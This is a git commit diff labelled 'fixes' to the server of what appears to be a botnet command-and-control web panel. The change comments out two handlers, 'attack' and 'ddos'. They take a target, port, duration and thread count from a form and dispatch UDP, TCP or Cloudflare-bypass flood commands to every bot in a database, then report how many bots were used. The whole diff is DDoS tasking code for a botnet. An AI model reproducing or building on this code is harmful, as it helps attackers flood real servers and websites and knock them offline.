558b223cada2489a0644a486e1713ca0c78c0268
Callumgm <Callumgm20052005@gmail.com>
2022-08-20 23:03:43 +0100

    fixes

--- src/server.py
+++ src/server.py
@@ -838,71 +838,71 @@ def sendcommands():
 					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)
 
 				
-				elif command_ == "attack": 
-					xx = 0
-					ddos_method 	= str(request.form.get('ddos-ip-method')).lower()
-					ddos_target 	= request.form.get('ddos-ip-target')
-					ddos_port 		= request.form.get('ddos-ip-port')
-					ddos_time	 	= request.form.get('ddos-ip-time')
-					ddos_thread 	= request.form.get('ddos-ip-thread')
-					if ddos_method == "udp" or ddos_method == "tcp": 
-						try: 
-							for x in database:
-								with ThreadPoolExecutor(max_workers=500) as executor:
-									executor.submit(call_script(xx, str(command))) ; xx+=1
+# 				elif command_ == "attack": 
+# 					xx = 0
+# 					ddos_method 	= str(request.form.get('ddos-ip-method')).lower()
+# 					ddos_target 	= request.form.get('ddos-ip-target')
+# 					ddos_port 		= request.form.get('ddos-ip-port')
+# 					ddos_time	 	= request.form.get('ddos-ip-time')
+# 					ddos_thread 	= request.form.get('ddos-ip-thread')
+# 					if ddos_method == "udp" or ddos_method == "tcp": 
+# 						try: 
+# 							for x in database:
+# 								with ThreadPoolExecutor(max_workers=500) as executor:
+# 									executor.submit(call_script(xx, str(command))) ; xx+=1
 
-							out += "\n\n" + f"""Attack sent successfully
+# 							out += "\n\n" + f"""Attack sent successfully
 
 
-    -------Attack Infomation-------
+#     -------Attack Infomation-------
 
-    IP:             \t{ddos_target}
-    Port:           \t{ddos_port}
-    Bots Amount:    \t{xx}
-    Attack Time:    \t{ddos_time}s
-    Attack Method:  \t{ddos_method}
-    Thread Amount:  \t{ddos_thread}
-"""
+#     IP:             \t{ddos_target}
+#     Port:           \t{ddos_port}
+#     Bots Amount:    \t{xx}
+#     Attack Time:    \t{ddos_time}s
+#     Attack Method:  \t{ddos_method}
+#     Thread Amount:  \t{ddos_thread}
+# """
 
-							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+# 							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
 
-						except Exception as e: 
-							print_debug("Error while sending command: " + str(e))
-							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+# 						except Exception as e: 
+# 							print_debug("Error while sending command: " + str(e))
+# 							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
 					
-					else: out += f"Invalid Attack Method: {ddos_method}"
+# 					else: out += f"Invalid Attack Method: {ddos_method}"
 
-				elif command_ == "ddos": 
-					xx = 0
-					ddos_method 	= str(request.form.get('ddos-website-method')).lower()
-					ddos_target 	= request.form.get('ddos-website-target')
-					ddos_time	 	= request.form.get('ddos-website-time')
-					ddos_thread 	= request.form.get('ddos-website-thread')
-					if ddos_method == "cfb" or ddos_method == "pxcfb" or ddos_method == "cfreq" or ddos_method == "cfsoc": 
-						try:
-							for x in database:
-								with ThreadPoolExecutor(max_workers=500) as executor:
-									executor.submit(call_script(xx, str(command))) ; xx+=1
+# 				elif command_ == "ddos": 
+# 					xx = 0
+# 					ddos_method 	= str(request.form.get('ddos-website-method')).lower()
+# 					ddos_target 	= request.form.get('ddos-website-target')
+# 					ddos_time	 	= request.form.get('ddos-website-time')
+# 					ddos_thread 	= request.form.get('ddos-website-thread')
+# 					if ddos_method == "cfb" or ddos_method == "pxcfb" or ddos_method == "cfreq" or ddos_method == "cfsoc": 
+# 						try:
+# 							for x in database:
+# 								with ThreadPoolExecutor(max_workers=500) as executor:
+# 									executor.submit(call_script(xx, str(command))) ; xx+=1
 
-							out += "\n\n" + f"""Attack sent successfully
+# 							out += "\n\n" + f"""Attack sent successfully
 
 
-    -------Attack Infomation-------
+#     -------Attack Infomation-------
 
-    Target:         \t{ddos_target}
-    Bots Amount:    \t{xx}
-    Attack Time:    \t{ddos_time}s
-    Attack Method:  \t{ddos_method}
-    Thread Amount:  \t{ddos_thread}
-"""
+#     Target:         \t{ddos_target}
+#     Bots Amount:    \t{xx}
+#     Attack Time:    \t{ddos_time}s
+#     Attack Method:  \t{ddos_method}
+#     Thread Amount:  \t{ddos_thread}
+# """
 							
-							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+# 							return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
 						
-						except Exception as e: 
-							print_debug("Error while sending command: " + str(e))
-							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+# 						except Exception as e: 
+# 							print_debug("Error while sending command: " + str(e))
+# 							return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
 					
-					else: out += f"Invalid Attack Method: {ddos_method}" ; return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+# 					else: out += f"Invalid Attack Method: {ddos_method}" ; return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
 
 				else:
 					command += str(command_check(str(command_)))
